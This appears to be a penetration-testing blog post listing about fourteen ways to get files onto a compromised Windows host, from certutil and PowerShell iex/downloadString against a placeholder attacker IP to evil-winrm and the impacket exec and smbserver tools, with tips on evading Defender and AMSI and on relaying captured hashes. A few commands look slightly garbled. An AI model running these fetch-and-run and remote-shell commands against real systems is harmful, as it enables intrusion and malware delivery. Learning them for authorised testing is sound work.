# The 10 ways hackers use to download files on Windows

## Welcome to another episode of, Defender is blocking me and I don't like it. 
Your therapist says - Have you thought about AMSI, maybe that one is the problem?

If you don't exactly know what these words mean but want to understand it better and are trying to jump into a career as a penetration tester or red-teamer, you came to the right place. 
Let's learn together how we can first of all download binaries, executables, powershell scripts, and whatever else your heart desires.
Disclaimer: You should not use your knowledge for anything illegal. Never. Safe the internet and protect its citizens. 

For this blog post we will go through 10+ ways of downloading files, on windows with a command line interface. 

# 10+ ways of downloading files via the command line on windows

### 1. Meterpreter shell
The infamous Metasploit framework is a common way to pop a shell on a compromised machine. It is beginner-friendly, frequently updated, and spans exploits from years in the past to recently released CVE's. You have session handling, multiple delivery paths, automatic AMSI-bypass (web-delivery), local exploit suggestion, and many, many more.

This conglomerate of functionality and features ensures its pole position. 
And it also has upload skills - all you have to do is type:

```bash
meterpreter > upload </home/kali/file_to_be_uploaded.exe>
```

Let the magic happen and your file appears on the box in your current working folder. As easy as that. 


## A trip to - Living off the Land
Sometimes we don't want external scripts or libraries to perform functions that the operating system is capable of as well. 
If we utilize system binaries / functionality to perform "hacking" tasks, e.g. downloading/uploading or privilege escalation it is called - living off the land attacks. 
Let's see what Windows has in store for us natively. 

### 2. certutil
Certutil is a command-line program that Microsoft usually uses for certificate services - [Microsoft Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil). It is present in `cmd.exe` environments where PowerShell might not be available for your user or other restrictions apply. 

We use the `-urlcache` option together with the `-f` flag - the former tells `certutil` to retrieve a "cached" certificate and the latter forces `certutil` to fetch the remote resource, which should be a certificate in theory (but it does not have to be ;) ). 

Another neat trick is that you can rename your files and thus make them less conspicuous, just add a new filename at the end of the download command and your file now has a shiny new name on the windows machine. 

```bash
certutil -urlcache -f http://<attackerIP>:<port>/file_to_be_uploaded.exe <new_filename.exe>
```

## PowerShell and cmdlets
Now we dive into the world of PowerShell, the only scripting language you will ever need in windows land (according to Microsoft?). I am still amazed about its design and ideas, so much that I constantly need a cheat sheet around in order to remember the basic syntax. 
One nice thing though - it is case-insensitive, no more capitalization typos for me, thank you. 
Chapeau to whoever designed it, I will never be as smart as you and fortunately, I am content with that.


Powershell uses lightweight commands - so-called `cmdlets`, which to me is similar to Unix one-liner aliases defined in your .bashrc combined with Python's object-oriented - everything is an object - style. 

>Technically, a `cmdlet` is a Microsoft .Net Class instance and it returns a Microsoft .Net object. They use a `verb-noun` syntax.

_To simplify things_: With our programming knowledge we can deduct that this resulting object potentially has its own functionalities/methods/attributes which we could explore and the object can be used for further processing within other `cmdlets` or scripts. 
You are also able to define your own `cmdlets` which is out of scope for this blog post, but the interested reader could check out: [cmdlet documentation](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.2) & [How to write a simple cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/how-to-write-a-simple-cmdlet?view=powershell-7.2)


### 3. invoke-expression
Back to the interesting bits and pieces, we can use Invoke-Expression to execute code on the local machine. One interesting way is to tell the machine to go and fetch some remote resource for us, sometimes also called downloading files ;). 

**The important part about about Invoke-Expression is that it does not touch the hard disk, everything is kept in memory, so it by design "evades" Windows Defender** (but not AMSI and real-time protection among others, unfortunately).

The [Microsoft documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2&viewFallbackFrom=powershell-6) warns users that the use of `invoke-expression` in scripts is discouraged, unless you use predefined inputs and don't let the user directly run their own "expressions". 

Typically, we use the `Net.Webclient` [class](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) together with the corresponding `downloadString`method, which naively downloads anything we point it to, without checking the contents of the remote resource (thank you for that). 

_In this case the remote file name will be the same after the download._ 

>Invoke-Expression can be abbreviated with `iex` in PowerShell which makes it a lot less typo-error prone. 

```bash
PS C:\> iex (New-Object Net.WebClient).downloadString("http://<attackerIP>:<port>/file_to_be_uploaded.exe")

# or 

PS C:\> echo -n 'iex (New-Object Net.WebClient).downloadString("http://<attackerIP>:<port>/file_to_be_uploaded.exe")'
```

### 4. Invoke-WebRequest
Another option is to use the `Invoke-WebRequest` cmdlet, should `Powershell Version 3` and newer be available. 
Under the hood, it uses Internet Explorer Engine to parse the request/response and it will throw an error if the said engine is not installed. 
An easy way to fix it - use the `-UseBasicParsing` flag for all your requests, which in Powershell 6 became the new default anyhow. 
This cmdlet has another potentially dangerous side-effect when used together with Responder.py + `-UseDefaultCredentials`. 
An attacker could then for example exfiltrate the password hash for the current user and relay it to perform `pass-the-hash-attacks`. 

>Invoke-WebRequest can be abbreviated with `iwr` - wohooo.

```bash
PS C:\> iwr -UseBasicParsing -Uri "http://<attackerIP>:<port>/file_to_be_uploaded.exe" -Outfile <new_filename.exe>
```


### 5. powershell + wget
What would a child between Windows and Linux look like you ask? I don't know, but Microsoft enabled `wget`as a wrapper around Invoke-WebRequest, which means if the system has Powershell 3+ you should be able to use `wget` in windows. 
```bash
PS C:\> wget -UseBasicParsing http://<attackerIP>:<port>/file_to_be_uploaded.exe -O <new_filename.exe>
```

### 6. powershell + curl
The linux-love story is not over yet, [recently](https://devblogs.microsoft.com/commandline/tar-and-curl-come-to-windows/) Microsoft shipped native binaries for `tar` and `curl`, which means the real deal `curl` executable should now be available on Windows in both cmd and Powershell. 
Additionally, after PowerShell version 3, there was also an alias around Invoke-WebRequest which enabled similar syntax. 

```bash

# powershell v3+
PS C:\> curl -UseBasicParsing http://<attackerIP>:<port>/file_to_be_uploaded.exe -O <new_filename.exe>

# Windows 10, version 1803+
C:\> curl http://<attackerIP>:<port>/file_to_be_uploaded.exe -o <new_filename.exe>
```

### 7. evil-winrm
When the nmap/rustscan output shows port 5985 open you have potentially hit the jackpot and are able to use `evil-winrm` to pop a remote shell. 
WinRM is a remote management toolkit that is exploitable and only needs two things:
1. credentials for the host, 2. to be activated, but if you see port 5985 open there is a high likelihood that this is the case.
For your convenience `evil-winrm` also has an upload functionality which is unfortunately not visible in the `help` but if you type `menu`. You need credentials for `winrm` and you can also enable it once you are on the box and have a privileged user - via `winrm quickconfig`.

```bash
*Evil-WinRM* PS C:\Users\maikroservice\> upload /home/kali/file_to_be_uploaded.exe
```

### 8. sftp
Since Windows 10 you have ssh support and that also means you have file transfer protocol via ssh aka `sftp`. You need remote credentials for this one but you can always use your local kali instance credentials to connect to. 
The usage is very similar to `ftp` - you are able to use basic commands, such as `pwd`, `dir`, and `put`/`get` to receive/send files. 
One very neat feature of `sftp` over `ftp` is the encryption via ssh, this should not be underrated in real-life engagements. 

```bash
PS C:\> sftp <user>@<AttackerIP> -P <ssh_remote_port>
sftp> put /home/kali/<file_to_be_uploaded.exe>
Fetching /home/kali/file_to_be_uploaded.exe to file_to_be_uploaded.exe
/home/kali/file_to_be_uploaded.exe    100% 130 8.6KB/s 00:00
```

### 9. scp
Along the same line, we can also use secure copy or `scp` to transfer files via ssh. For this, we again need credentials for a remote host (usually your kali machine) and a file that we want to be uploaded. This is also encrypted via ssh so more secure than some of the http-based transfers we explored earlier. It should come with newer windows versions and most linux distros. 
```bash
scp <username>@<AttackerIP>:/home/kali/file_to_be_uploaded.exe <file_location_on_windows, e.g. c:\users\maikroservice\desktop\file_to_be_uploaded.exe>
```

## impacket

For the last five ways to get your files onto a Windows-box we will look at the `impacket` toolkit. 

For all of the following methods you will need credentials and some of them only work if their counterparts are enabled on the Windows machine itself. 

Technically, they are living off the land attacks as well, but since you need to remotely initiate the shell and they are all packaged under the `impacket` umbrella I wanted to give them their own category.

Note:
*One of the hardest tasks an aspiring cybersecurity aficionado has to take care of is installing `impacket` and making sure to have the most up-to-date version of it. 
Some say it is harder than escaping vim, others are still stuck trying to find which folder contains the correct python files on their kali linux.*

I have come to help and share how I use them easily:

>usually `impacket` might be already installed on your kali and the individual scripts can be used via `impacket-<script_name>` in your kali terminal



### 10. impacket-wmiexec
WMI, or `Windows Management Instrumentation` is an admin feature for remote management of machines. The power of `wmiexec` lies in the details, if it is available we don't get a pseudo-shell but we are able to start processes instead (minor detail, but huge for evading detection / leaving a clean environment). This means we don't need to transfer an arbitrary executable to do something but we use native Windows Remote Management tools to do our bidding. 

More details as to how to use WMI for event-based notifications (e.g. a user logs in and you can now dump their credentials using `mimikatz` or similar) can be found in this [blog post](https://www.varonis.com/blog/wmi-windows-management-instrumentation/). 

You can use `lput` to upload files to the Windows machine like so:

```bash
impacket-wmiexec <username>:<password>@<windows_machine_ip>
Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>lput /home/kali/file_to_be_uploaded.exe
```

### 11. impacket-psexec
Number 11 is an interesting one, `psexec` is a telnet replacement tool, which is part of the PsTools suite, that you can [download](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) from the Microsoft website and it enables command-line based code execution (on remote machines). You don't have to install `psexec`, but only transfer the binary to the Windows machine via a method of your choice. 
Interestingly, `psexec` has been used in viruses before and thus is sometimes picked up by third-party anti-virus scanners. 
Interestingly^2, prior to version 2.1 the traffic was apparently not encrypted so you might want to check which version is present to see if your passwords are sent in a secure manner. 
Execution is only possible if realtime-detection is disabled (at least it was on my Windows 10 Test-System) and as all the `exec` parts of impacket, this does not have an inherent upload functionality, but can copy remote binaries / code. 
```bash
impacket-psexec <username>:<password>@<windows_machine_ip>
Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.10.....
[*] Found writable share ADMIN$
[*] Uploading file FvVjzAJr.exe
[*] Opening SVCManager on 10.10.10.10.....
[*] Creating service NKIK on 10.10.10.10.....
[*] Starting service NKIK.....
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows> psexec.exe \\<attackerIP> -u <username> -p <password> -c -csrc "<path_to_file_to_be_uploaded, e.g. C:\path to\PowerView.ps1>" <new_filename_on_windows_box>
```

### 12. impacket-smbserver
The smbserver is a neat tool, that is usable in two ways. 
One - you can use it as a remote network drive to run executables off of directly.
Two - you can copy the desired files from/to the smbserver, e.g. via the `copy` or `cp` commands 
Three ;) - you can capture hashes using the smbserver and then crack the hash or relay/pass it (tip: try your hands on the box `Buff` on hackthebox.com, you can use this technique)

Typically this works fairly well, should you encounter issues then smb-signing or smb2 might be the culprits. 
The latter can be solved easily via the `-smb2support` flag. 

```bash
# on your machine
impacket-smbserver -smb2support <name_of_the_share (you can choose any)> .  
Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

# on the Windows machine
copy \\<attackerIP>\<name_of_the_share>\file_to_be_uploaded.exe .

# what you will see on your machine afterwards

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.100,63109)
```

### 13. impacket-smbexec
Impackets' `smbexec` works in a very similar way to `psexec`, it uploads an executable that will start a service and thus offer a reverse shell back to our script. 

It is also detected by current real-time protection enabled Microsoft Defender. The error you might receive looks something like this: `SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)`.
The resulting shell is only a semi-interactive shell and some commands might not work in this one (`pwd` among others).
Technically this semi-interactive shell also does not have the ability to upload files per-se but you can combine it with `certutil` or `iex` or another method from the living off the land section. 
```bash
impacket-smbexec <username>:<password>@<windowsIP>
Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```cer

### 14. impacket-atexec
Atexec is a Task Scheduler Service based remote code execution method that can be employed if you have credentials for the remote Windows box. 
It is a little more on the complex side, because you only get remote command execution but no interactive shell or pseudoshell. 
You could however use it to transfer files with the living of the land or impacket-smbserver methods.
```bash
impacket-atexec <username>:<password>@<windowsIP> <command_to_run (e.g. whoami)>
Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \gVldUnwT
[*] Running task \gVldUnwT
[*] Deleting task \gVldUnwT
[*] Attempting to read ADMIN$\Temp\gVldUnwT.tmp
[*] Attempting to read ADMIN$\Temp\gVldUnwT.tmp
nt authority\system
```

## Shoutout and thank you for reading all of this!
I would like to thank you again for staying with me and learning new things on a daily basis. The sheer amount of information and options available to perform tasks such as uploading a file to a remote host is astonishing for me. 
It is one of the reasons why I continue to thrive in cybersecurity and why it is by far the most interesting field I have ever dabbled in. 
Thank you for reading until here and should you have any other tools that you use to upload things to Windows machines feel encouraged to share them in the comment section.

Until next time, You are wizards, purple wizards. 